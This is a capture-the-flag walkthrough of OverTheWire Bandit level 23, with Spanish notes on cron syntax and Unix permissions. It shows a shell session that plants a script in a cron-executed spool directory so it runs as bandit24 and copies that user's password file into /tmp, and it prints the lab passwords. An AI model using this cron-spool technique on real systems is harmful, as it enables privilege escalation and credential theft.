
## Goal
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## data access
bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solution

```
bandit23@bandit:~$
bandit23@bandit:~$ ls
bandit23@bandit:~$ ls -la /etc/cron.d
total 56
drwxr-xr-x   2 root root  4096 Oct  5 06:20 .
drwxr-xr-x 106 root root 12288 Oct  5 06:20 ..
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit15_root
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit17_root
-rw-r--r--   1 root root   120 Oct  5 06:19 cronjob_bandit22
-rw-r--r--   1 root root   122 Oct  5 06:19 cronjob_bandit23
-rw-r--r--   1 root root   120 Oct  5 06:19 cronjob_bandit24
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit25_root
-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
-rwx------   1 root root    52 Oct  5 06:20 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
bandit23@bandit:~$ cat /etc/cr
cron.d/               cron.daily/           cron.hourly/          cron.monthly/         crontab               cron.weekly/          cryptsetup-initramfs/ crypttab
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/carpetaConContrasena
bandit23@bandit:~$ cd /tmp/carpetaConContrasena
bandit23@bandit:/tmp/carpetaConContrasena$ ls
bandit23@bandit:/tmp/carpetaConContrasena$ nano obtenerContrasena.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/carpetaConContrasena$ nano obtenerContrasena.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/carpetaConContrasena$ cat obtenerContrasena.sh
#!bin/bash
gitgit
cat /etc/bandit_pass/bandit24 > /tmp/carpetaConContrasena/contrasena.txt

bandit23@bandit:/tmp/carpetaConContrasena$ nano obtenerContrasena.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/carpetaConContrasena$ nano obtenerContrasena.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/carpetaConContrasena$ cat obtenerContrasena.sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/carpetaConContrasena/contrasena.txt

bandit23@bandit:/tmp/carpetaConContrasena$ ls
obtenerContrasena.sh
bandit23@bandit:/tmp/carpetaConContrasena$ file obtenerContrasena.sh
obtenerContrasena.sh: Bourne-Again shell script, ASCII text executable
bandit23@bandit:/tmp/carpetaConContrasena$ cp obtenerContrasena.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/carpetaConContrasena$ date
Tue Feb 27 04:26:36 AM UTC 2024
bandit23@bandit:/tmp/carpetaConContrasena$ date
Tue Feb 27 04:26:40 AM UTC 2024
bandit23@bandit:/tmp/carpetaConContrasena$ ls
obtenerContrasena.sh
bandit23@bandit:/tmp/carpetaConContrasena$ date
Tue Feb 27 04:27:12 AM UTC 2024
bandit23@bandit:/tmp/carpetaConContrasena$ ls
obtenerContrasena.sh
bandit23@bandit:/tmp/carpetaConContrasena$ chmod +rx obtenerContrasena.sh
bandit23@bandit:/tmp/carpetaConContrasena$ ls
obtenerContrasena.sh
bandit23@bandit:/tmp/carpetaConContrasena$ cp obtenerContrasena.sh /var/spool/bandit24/foo/obtenerContrasena.sh
bandit23@bandit:/tmp/carpetaConContrasena$ date
Tue Feb 27 04:29:18 AM UTC 2024
bandit23@bandit:/tmp/carpetaConContrasena$ ls
obtenerContrasena.sh
bandit23@bandit:/tmp/carpetaConContrasena$ chmod 777 /tmp/carpetaConContrasena
bandit23@bandit:/tmp/carpetaConContrasena$ cp obtenerContrasena.sh /var/spool/bandit24/foo/obtenerContrasena.sh
bandit23@bandit:/tmp/carpetaConContrasena$ ls
contrasena.txt  obtenerContrasena.sh
bandit23@bandit:/tmp/carpetaConContrasena$ cat contrasena.txt
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/carpetaConContrasena$



```

## notes

`* * * * *`: Esto especifica la programación del cronjob. En este caso, significa "cada minuto de cada hora de cada día de cada mes de cada día de la semana". En otras palabras, este cronjob se ejecutará cada minuto.

`&> /dev/null`: Esto redirige tanto la salida estándar (stdout) como la salida de error (stderr) del script a `/dev/null`, que es un dispositivo especial en Unix/Linux que descarta todos los datos escritos en él. En otras palabras, esto significa que no habrá salida visible del script cuando se ejecute, ya que se está enviando a la "nada".

cundo queremos que algo que fue creado por un usuario en este caso bandit23 pueda tener acceso otro usuario se le tienen que dar permisos.
	se le da permiso a el archivo bash para que cuando lo enviemos al directorio con todos los scripts este lo pueda correr.
	tambien se le da permiso a la carpeta ya que dentro del script se manda a crear el archivo con la contrasena del usuario.

Permisos:

Cada dígito se calcula sumando los valores correspondientes para los permisos:

- `r` (lectura) tiene un valor de 4.
- `w` (escritura) tiene un valor de 2.
- `x` (ejecución) tiene un valor de 1.
-
- En un archivo, los permisos `r` (lectura), `w` (escritura) y `x` (ejecución) tienen significados distintos.
-
- En una carpeta, `r` permite listar el contenido de la carpeta, `w` permite modificar el contenido de la carpeta (crear, eliminar o renombrar archivos dentro de ella) y `x` permite atravesar la carpeta (usar `cd` para entrar a ella).
Script
```
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/carpetaConContrasena/contrasena.txt

```
## references


